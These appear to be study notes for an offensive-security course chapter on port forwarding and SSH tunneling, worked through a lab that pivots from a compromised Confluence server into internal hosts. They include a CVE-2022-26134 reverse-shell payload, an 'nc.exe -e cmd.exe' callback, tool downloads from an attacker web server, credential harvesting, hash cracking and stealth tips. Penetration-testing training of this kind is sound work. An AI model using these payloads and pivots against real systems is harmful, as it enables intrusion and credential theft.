# Port Redirection and SSH Tunneling Cheat Sheet (PEN-200, Ch. 19)

## 19.1 Why port redirection and tunneling?

- **Flat network** = all devices can freely reach each other → poor security practice; one compromised host lets an attacker reach everything. Segmentation (firewalls, subnets, DMZs) is the countermeasure.
- **Firewalls**: implemented at endpoint (Linux `iptables`, Windows Defender Firewall) or as network infra (hardware firewall). Usually rule-based on IP/port; **Deep Packet Inspection (DPI)** adds content-based filtering.
- **Port redirection** (this chapter's umbrella term for port forwarding): redirects packets from one socket to another.
- **Tunneling**: encapsulates one data stream inside another (e.g., HTTP inside SSH) — from the outside, only the outer (SSH) protocol is visible.
- Both techniques let an attacker traverse network boundaries the admins put up. This chapter builds complexity step-by-step: Socat port forwarding → SSH local/dynamic/remote/remote-dynamic forwarding → sshuttle → Windows-native tools (ssh.exe, Plink, Netsh).

> A **DMZ** is a buffer network segment between a wider/less-trusted network (WAN) and internal hosts — more exposed devices live here.

---

## 19.2 Port forwarding

**Port forwarding**: configure a host to listen on one port and relay all packets received on it to another destination/port (same concept admins use to expose an internal web server through a firewall, or a home router uses for internet → LAN forwarding).

### 19.2.1 A simple port forwarding scenario

**Lab scenario (recurring throughout the chapter):**
- `CONFLUENCE01` — Linux, vulnerable Confluence (CVE-2022-26134, pre-auth RCE), straddles the WAN (attacker-reachable) and an internal DMZ subnet. Listens on TCP 8090 (Confluence).
- `PGDATABASE01` — PostgreSQL (TCP 5432) in the DMZ, **not** directly routable from Kali. Credentials found in Confluence's config point here.
- Goal: pivot through CONFLUENCE01 to reach PGDATABASE01.

**Exploiting CVE-2022-26134 (OGNL injection → RCE) for an initial shell:**
```bash
# Rapid7 PoC payload (URL-encoded OGNL injection via javax.script.ScriptEngineManager -> ProcessBuilder)
curl http://<TARGET>:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/<LHOST>/<LPORT>%200%3E%261%27%29.start%28%29%22%29%7D/

# Kali listener first:
nc -nvlp 4444
```

> Never run an unfamiliar PoC blind — URL-decode it first (Burp Decoder → Decode as URL, or CyberChef) to understand exactly what it does before customizing IPs/ports and firing it.

> Don't URL-encode the *whole* modified payload again — some characters (`.`, `/`, `:` etc.) are load-bearing for correct URL parsing; only the originally-encoded segments should stay encoded.

**Post-shell enumeration on CONFLUENCE01:**
```bash
ip addr                     # enumerate interfaces (found: ens192 = 192.168.50.63 WAN, ens224 = 10.4.50.63 DMZ)
ip route                    # confirm which subnet routes through which interface
```

Credentials for PGDATABASE01 were found in Confluence's own config file:
```
cat /opt/atlassian/confluence/confluence.cfg.xml   # (path referenced by conf); look for hibernate.connection.* properties
# hibernate.connection.url = jdbc:postgresql://10.4.50.215:5432/confluence
# hibernate.connection.username = postgres
# hibernate.connection.password = D@t4basePassw0rd!
```

**The limitation:** CONFLUENCE01 (low-priv `confluence` user) has no PostgreSQL client and can't install one; Kali has `psql` but can't route to PGDATABASE01 directly. No firewall stops binding a port on CONFLUENCE01's WAN interface → port forwarding is the fix.

### 19.2.3 Port forwarding with Socat

**Socat** = general-purpose networking/relay tool, sets up a port forward in one command. Not installed by default on most *NIX — download a statically-linked binary if missing.

```bash
# On CONFLUENCE01 (pivot host): listen on 2345, fork per connection, forward to PGDATABASE01:5432
socat -ddd TCP-LISTEN:2345,fork TCP:10.4.50.215:5432
```
- `-ddd` = verbose logging
- `TCP-LISTEN:2345,fork` = listen on 2345, spawn a new subprocess per connection (survives multiple connections instead of dying after one)
- `TCP:10.4.50.215:5432` = forward destination

> Use an unprivileged port (>1024) like 2345 when running as a non-root user — no elevated privileges required to bind it.

> Unusual listening ports or outbound connections from a non-privileged service account can raise defender red flags — consider ephemeral tooling / covert channels / chaining to stay stealthy on an engagement.

```bash
# From Kali, connect to the forward as if talking directly to PGDATABASE01
psql -h 192.168.50.63 -p 2345 -U postgres
postgres=# \l                          # list databases
postgres=# \c confluence               # connect to confluence db
confluence=# select * from cwd_user;   # dump Confluence users + password hashes (PBKDF2-HMAC-SHA1 / {PKCS5S2})
```

**Cracking the dumped hashes:**
```bash
hashcat -m 12001 hashes.txt /usr/share/wordlists/fasttrack.txt   # 12001 = Atlassian PBKDF2-HMAC-SHA1
```
Cracked creds reused elsewhere on the network (credential reuse is common) — e.g. `database_admin` password recovered this way.

**Second Socat forward — pivot to SSH on PGDATABASE01:**
```bash
socat TCP-LISTEN:2222,fork TCP:10.4.50.215:22
```
```bash
ssh database_admin@192.168.50.63 -p2222     # from Kali; behaves exactly like ssh'ing directly to PGDATABASE01:22
```

**Other *NIX port-forwarding alternatives to Socat (noted, not demoed):**
| Tool | Notes |
|---|---|
| `rinetd` | Runs as a daemon — better for long-term forwards, clunkier for quick/temporary ones |
| Netcat + FIFO named pipe | Manual port-forward construction with `mkfifo` + two `nc` processes |
| `iptables` | Requires root; exact ruleset depends on existing config; also requires enabling IP forwarding: `echo 1 > /proc/sys/net/ipv4/conf/[interface]/forwarding` |

---

## 19.3 SSH tunneling

SSH is fundamentally a **tunneling protocol** — nearly any data can ride inside an encrypted SSH connection. Advantages for an attacker:
- Blends into normal admin traffic (SSH is ubiquitous for legit remote administration/forwarding) — low anomaly footprint in lightly-monitored networks.
- Contents of the tunnel can't be easily inspected by network security devices.
- OpenSSH client is now commonly found on both *NIX and Windows hosts.

Four SSH forwarding types covered: **local**, **dynamic**, **remote**, **remote dynamic**.

### 19.3.1 SSH local port forwarding

Like the Socat scenario, but **listening and forwarding happen on different ends of an SSH connection** rather than both on the same host. Traffic is forwarded through the encrypted SSH tunnel instead of in the clear.

**Scenario continuation:** `database_admin` SSH's from CONFLUENCE01 into PGDATABASE01, which turns out to be attached to yet another subnet (`172.16.50.0/24`) containing a host with SMB (445) open (later named `HRSHARES`, `172.16.50.217`). Goal: reach that SMB share from Kali.

```bash
# TTY upgrade before interactive SSH work
python3 -c 'import pty; pty.spawn("/bin/sh")'
ssh database_admin@10.4.50.215          # CONFLUENCE01 -> PGDATABASE01

# On PGDATABASE01: enumerate further
ip addr
ip route
for i in $(seq 1 254); do nc -zv -w 1 172.16.50.$i 445; done   # sweep /24 for open SMB
```

**OpenSSH `-L` syntax:**
```
ssh -L [LOCAL_IP:]LOCAL_PORT:DEST_IP:DEST_PORT user@SSH_SERVER
```
- `LOCAL_IP:LOCAL_PORT` = listening socket on the **SSH client** side — where packets enter the tunnel.
- `DEST_IP:DEST_PORT` = destination socket reachable from the **SSH server** side — where packets exit after tunneling.

```bash
# From a reverse shell on CONFLUENCE01 (as confluence user, TTY via pty), SSH to PGDATABASE01
# and bind 0.0.0.0:4455 on CONFLUENCE01, forwarding through the tunnel to 172.16.50.217:445
ssh -N -L 0.0.0.0:4455:172.16.50.217:445 database_admin@10.4.50.215
```
- `-N` = don't execute a remote command / don't spawn a shell — session exists purely to hold the forward open (expect no output after auth).
- `-v` = add for debug output if a forward isn't working.
- Non-privileged listening port (4455) required since `confluence` user can't bind <1024.

```bash
# Verify the listener from another reverse shell on CONFLUENCE01
ss -ntplu                                # look for LISTEN 0.0.0.0:4455 owned by ssh pid
```

```bash
# From Kali, connect to CONFLUENCE01:4455 as if talking directly to the SMB host
smbclient -p 4455 -L //192.168.50.63/ -U hr_admin --password=Welcome1234
smbclient -p 4455 //192.168.50.63/scripts -U hr_admin --password=Welcome1234
smb: \> ls
smb: \> get Provisioning.ps1
```

> Local port forwarding is single-socket-per-connection — fine for one target/port, but tedious at scale (need a new `-L` + new SSH connection per destination).

### 19.3.2 SSH dynamic port forwarding

Solves the local-forward scaling problem: a **single listening port on the SSH client becomes a SOCKS proxy**. Any SOCKS-aware client tool can then reach *any* socket the SSH server can route to, through that one connection.

> SOCKS forwarding isn't automatic "magic" — client tools (e.g. Proxychains) must wrap outbound connections in SOCKS protocol headers so the SOCKS server (here, OpenSSH) knows where to actually send the traffic.

```bash
python3 -c 'import pty; pty.spawn("/bin/sh")'
ssh -N -D 0.0.0.0:9999 database_admin@10.4.50.215
```
- `-D [bind_addr:]port` = create dynamic (SOCKS) forward, listening on `port`. No destination socket needed — that's the point.
- `-N` again to suppress remote command execution.

> SOCKS4 vs **SOCKS5**: SOCKS5 adds auth, IPv6, and UDP (incl. DNS) support. Confirm which version an SSH server offers before assuming SOCKS5 features work.

**Proxychains** — forces third-party tool traffic (that isn't natively SOCKS-aware, e.g. `smbclient`, `nmap`) through an HTTP/SOCKS proxy.
```bash
# /etc/proxychains4.conf -- edit the [ProxyList] entry at the bottom:
socks5 192.168.50.63 9999

proxychains smbclient -L //172.16.50.217/ -U hr_admin --password=Welcome1234
sudo proxychains nmap -vvv -sT --top-ports=20 -Pn 172.16.50.217
```
- `-sT` (connect scan) required — proxied scans can't do raw-socket SYN scans.
- `-Pn` skip host discovery (ICMP typically won't traverse a SOCKS proxy).
- `-n` skip DNS resolution.

> Nmap's built-in `--proxies` option is still "under development" per its own docs and isn't reliable for port scanning — use Proxychains instead.

> Proxychains ships with very high default timeouts, making scans slow. Lower `tcp_read_time_out` / `tcp_connect_time_out` in `/etc/proxychains4.conf` to speed up scanning through the proxy.

### 19.3.3 SSH remote port forwarding

Local/dynamic forwarding assumes you can bind a port that's reachable *inbound* on the pivot's WAN interface — real firewalls usually block that. **Outbound** connections are typically far less restricted, so instead: SSH **out** of the target network back to an SSH server the attacker controls (e.g. Kali), and let the SSH **client** (not server) do the packet forwarding.

**Scenario:** firewall now added at the perimeter — only TCP 8090 (Confluence) reachable inbound to CONFLUENCE01. Still need to reach PGDATABASE01:5432. Fix: stand up an SSH server on Kali, SSH *from* CONFLUENCE01 *to* Kali, with a remote forward.

```bash
# On Kali: enable + verify the SSH server
sudo systemctl start ssh
ss -ntplu                     # confirm 0.0.0.0:22 / [::]:22 LISTEN
```

> Before starting the Kali SSH server, set a strong, unique password — you're opening a reachable SSH listener.

> To allow password auth back to the Kali SSH server, may need `PasswordAuthentication yes` in `/etc/ssh/sshd_config`.

**OpenSSH `-R` syntax** (same two-socket-pair shape as `-L`, but listening socket is now on the **SSH server** = Kali, forwarding is done by the **SSH client** = CONFLUENCE01):
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
ssh -N -R 127.0.0.1:2345:10.4.50.215:5432 kali@192.168.118.4
```
- Binds `127.0.0.1:2345` on the **Kali** loopback interface; anything sent there is pushed back through the tunnel to CONFLUENCE01, which forwards to `10.4.50.215:5432` (PGDATABASE01).

```bash
# On Kali, verify + use
ss -ntplu                                        # look for 127.0.0.1:2345 LISTEN
psql -h 127.0.0.1 -p 2345 -U postgres
```

> Remote forwarding is single-socket-per-connection just like local forwarding — same scaling pain, solved next by remote *dynamic* forwarding.

### 19.3.4 SSH remote dynamic port forwarding

Combines remote forwarding's "listen on attacker's SSH server, forward from target's SSH client" model with dynamic forwarding's "single SOCKS port, any destination" flexibility.

> Available since **OpenSSH 7.6 (October 2017)**. Only the **client** initiating the connection needs 7.6+ — the server side has no such requirement.

**Scenario:** add `MULTISERVER03` (Windows) behind CONFLUENCE01/PGDATABASE01, reachable only from PGDATABASE01's subnet. Want a SOCKS proxy on Kali that can reach anything CONFLUENCE01 can reach — including MULTISERVER03 — through one tunnel.

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
ssh -N -R 9998 kali@192.168.118.4
```
- `-R port` with **no destination socket and no bind address** = remote *dynamic* forward (uses the same `-R` flag, just a different argument shape — the SOCKS proxy is bound on the SSH **server**, i.e. Kali, on `port`).

```bash
# On Kali, confirm the SOCKS listener
sudo ss -ntplu                   # 127.0.0.1:9998 and [::1]:9998 LISTEN, owned by sshd

# /etc/proxychains4.conf:
socks5 127.0.0.1 9998

proxychains nmap -sT -Pn -n --top-ports=20 -vvv 10.4.50.64      # scan MULTISERVER03 through the tunnel
```

> Windows Defender Firewall commonly blocks ICMP by default — always pair Proxychains/Nmap through a SOCKS tunnel with `-Pn` (skip host discovery) or hosts will appear down.

### sshuttle (VPN-like alternative to dynamic forwarding)

Turns an SSH connection into a transparent, VPN-like tunnel by installing local routes that push matching subnet traffic through SSH automatically — no Proxychains/per-tool config needed.

- Requires **root on the SSH client** (to modify local routes) and **Python3 on the SSH server**.
- Heavier/less lightweight than dynamic forwarding, but far more convenient once set up — good when you have direct SSH access to a host that fronts a complex internal network.

```bash
# Pivot forward still needed to reach PGDATABASE01's SSH (via CONFLUENCE01):
socat TCP-LISTEN:2222,fork TCP:10.4.50.215:22

# From Kali: -r <user@host:port>, then list of subnets to route through the tunnel
sshuttle -r database_admin@192.168.50.63:2222 10.4.50.0/24 172.16.50.0/24
```

After this, ordinary tools work with zero extra config, as if Kali were directly on those subnets:
```bash
smbclient -L //172.16.50.217/ -U hr_admin --password=Welcome1234   # works transparently, no -p/proxychains needed
```

---

## 19.4 Port forwarding with Windows tools

### 19.4.1 ssh.exe

- OpenSSH client bundled with Windows by default since **1803 (April 2018 Update)**; available as a Feature-on-Demand since **1709**.
- Default location: `%systemdrive%\Windows\System32\OpenSSH\` (`ssh.exe`, `scp.exe`, `sftp.exe`, other `ssh-*` utilities).
- Windows' SSH client can connect to **any** SSH server (not just Windows-compiled ones) given valid creds.

**Scenario:** `MULTISERVER03` (Windows) reachable only via RDP; want a remote dynamic forward back to Kali to reach PGDATABASE01.

```bash
sudo systemctl start ssh                                          # Kali SSH server
xfreerdp /u:rdp_admin /p:P@ssw0rd! /v:192.168.50.64               # RDP into MULTISERVER03
```

```cmd
where ssh
:: C:\Windows\System32\OpenSSH\ssh.exe
ssh.exe -V
:: OpenSSH_for_Windows_8.1p1, LibreSSL 3.0.2   (>=7.6 -> remote dynamic forwarding supported)

ssh -N -R 9998 kali@192.168.118.4
```

```bash
# Kali side
ss -ntplu                              # confirm 127.0.0.1:9998 / [::1]:9998
# /etc/proxychains4.conf: socks5 127.0.0.1 9998
proxychains psql -h 10.4.50.215 -U postgres
```

> Windows OpenSSH's dynamic/remote-dynamic forwarding is genuinely useful for mixed-OS environments — same syntax and capability as the Linux client.

### 19.4.2 Plink (PuTTY suite)

Admins may deliberately strip OpenSSH from Windows hosts; PuTTY / **Plink** (PuTTY's CLI-only sibling) are the classic fallback admin tooling — and being "known good" admin tools, they're less likely to be flagged by AV than attacker-branded utilities.

> Plink lacks **remote dynamic** port forwarding (OpenSSH's `-R` with no destination works; Plink's doesn't support this mode) — otherwise it covers local/remote/dynamic like OpenSSH.

**Scenario:** `MULTISERVER03` exposes only a web app on port 80 (RDP now blocked); web shell (`/umbraco/forms.aspx`) gives code exec as `iis apppool\defaultapppool`.

```bash
# Kali: host payloads for the target to pull
sudo systemctl start apache2
find / -name nc.exe 2>/dev/null
sudo cp /usr/share/windows-resources/binaries/nc.exe /var/www/html/
find / -name plink.exe 2>/dev/null
sudo cp /usr/share/windows-resources/binaries/plink.exe /var/www/html/
nc -nvlp 4446                                    # catch the reverse shell
```

```powershell
# Via the web shell (PowerShell one-liners to download tools to the target)
powershell wget -Uri http://192.168.118.4/nc.exe -OutFile C:\Windows\Temp\nc.exe
```
```cmd
C:\Windows\Temp\nc.exe -e cmd.exe 192.168.118.4 4446
```
```powershell
powershell wget -Uri http://192.168.118.4/plink.exe -OutFile C:\Windows\Temp\plink.exe
```

**Plink remote port forward** (RDP → Kali, so xfreerdp on Kali can reach MULTISERVER03's RDP indirectly):
```cmd
C:\Windows\Temp\plink.exe -ssh -l kali -pw <PASSWORD> -R 127.0.0.1:9833:127.0.0.1:3389 192.168.118.4
```

> `-pw` puts the password on the command line in plaintext — may get logged (process lists, shell history, EDR telemetry). Consider a dedicated port-forwarding-only account on the Kali box for hostile-network engagements.

> On limited/non-interactive shells, Plink's host-key-cache confirmation prompt (`Store key in cache? (y/n)`) can't be answered interactively — automate it: `cmd.exe /c echo y | C:\Windows\Temp\plink.exe -ssh -l kali -pw <PW> ...`

```bash
# Kali side
ss -ntplu                                            # confirm 127.0.0.1:9833 LISTEN
xfreerdp /u:rdp_admin /p:P@ssw0rd! /v:127.0.0.1:9833  # RDP to MULTISERVER03 through the Plink tunnel
```

> Plink is a good fit when only shell access (no GUI) is available and files can be uploaded — standalone exe, no install. Downsides: no remote-dynamic forwarding, and command-line password exposure risk.

### 19.4.3 Netsh (native Windows port forwarding)

`netsh` (Network Shell) — Windows' built-in firewall/network config tool. The `interface portproxy` subcontext creates port forwards **without any external tooling**, but requires **administrative privileges**.

**Scenario:** `MULTISERVER03` has web app (80) and RDP (3389) open inbound; want to SSH straight into PGDATABASE01 from Kali via a forward on MULTISERVER03.

```cmd
:: RDP in as admin, then in an elevated cmd.exe:
netsh interface portproxy add v4tov4 listenport=2222 listenaddress=192.168.50.64 connectport=22 connectaddress=10.4.50.215

netstat -anp TCP | find "2222"                 :: confirm LISTENING
netsh interface portproxy show all             :: list configured forwards
```

**Windows Firewall still blocks the new inbound port** — need a firewall rule too:
```cmd
netsh advfirewall firewall add rule name="port_forward_ssh_2222" protocol=TCP dir=in localip=192.168.50.64 localport=2222 action=allow
```

> Give the firewall rule a memorable/descriptive name — you'll need to reference it exactly to delete it later.

```bash
sudo nmap -sS 192.168.50.64 -Pn -n -p2222      # before the rule: filtered; after: open
ssh database_admin@192.168.50.64 -p2222         # now reaches PGDATABASE01:22 through MULTISERVER03
```

**Cleanup (don't skip this):**
```cmd
netsh advfirewall firewall delete rule name="port_forward_ssh_2222"
netsh interface portproxy del v4tov4 listenport=2222 listenaddress=192.168.50.64
```

> Caution: remember to plug the firewall hole you poked as soon as you're done with it — leaving it open is an unnecessary persistent exposure.

> PowerShell has cmdlet equivalents for most Windows Firewall operations (`New-NetFirewallRule`, `Disable-NetFirewallRule`, etc.) — but **no PowerShell equivalent for `netsh interface portproxy`**. Portproxy work stays pure `netsh`.

Netsh portproxy = no external dependencies, but needs admin rights and **leaves configuration + firewall artifacts behind** unless manually cleaned up — good for constrained/native-tools-only environments, weaker for stealth.

> Tip: pick the forwarding tool that fits your actual constraints — GUI vs shell-only access, Windows vs *NIX, native vs portable binary. Effective pivoting is about adapting the tool to the environment, not forcing one tool everywhere.

---

## Key Takeaways / Workflow Summary

1. **Recognize the need**: segmented/firewalled networks block direct routing to interesting hosts — port redirection/tunneling re-establishes reachability from a compromised pivot.
2. **Socat** (`TCP-LISTEN:port,fork TCP:dest:port`) — simplest same-host listen-and-forward; great when you can bind a reachable port directly on the pivot and there's no restrictive perimeter firewall.
3. **SSH local (`-L`)** — client-side listener, forwards outbound from the SSH client's connection point; good for single destination, one connection at a time.
4. **SSH dynamic (`-D`)** — client-side SOCKS proxy; pair with **Proxychains** for tools lacking native SOCKS support; scales to any destination the SSH server can reach.
5. **SSH remote (`-R host:port:dest:port`)** — flips the model when only outbound connections are allowed: forward from a listener on *your* SSH server back through the target's SSH client.
6. **SSH remote dynamic (`-R port`, OpenSSH 7.6+)** — remote + dynamic combined: SOCKS proxy on your box, reachable destinations decided by the pivot's routing.
7. **sshuttle** — VPN-like alternative to dynamic forwarding: transparent routing, no per-tool Proxychains config, but needs root (client) + Python3 (server).
8. **Windows-native options**: `ssh.exe` (bundled since 1803, full OpenSSH feature parity incl. remote-dynamic), **Plink** (lighter/stealthier, no remote-dynamic, watch `-pw` exposure), **Netsh `interface portproxy` + `advfirewall`** (zero extra tooling, needs admin, leaves artifacts — always clean up rules/proxies afterward).
9. Always match the technique to constraints: inbound vs outbound reachability, admin vs low-priv, GUI vs shell-only, native vs uploadable binaries — and mind stealth (unusual ports/processes, AV-flagged tools, firewall rule artifacts).
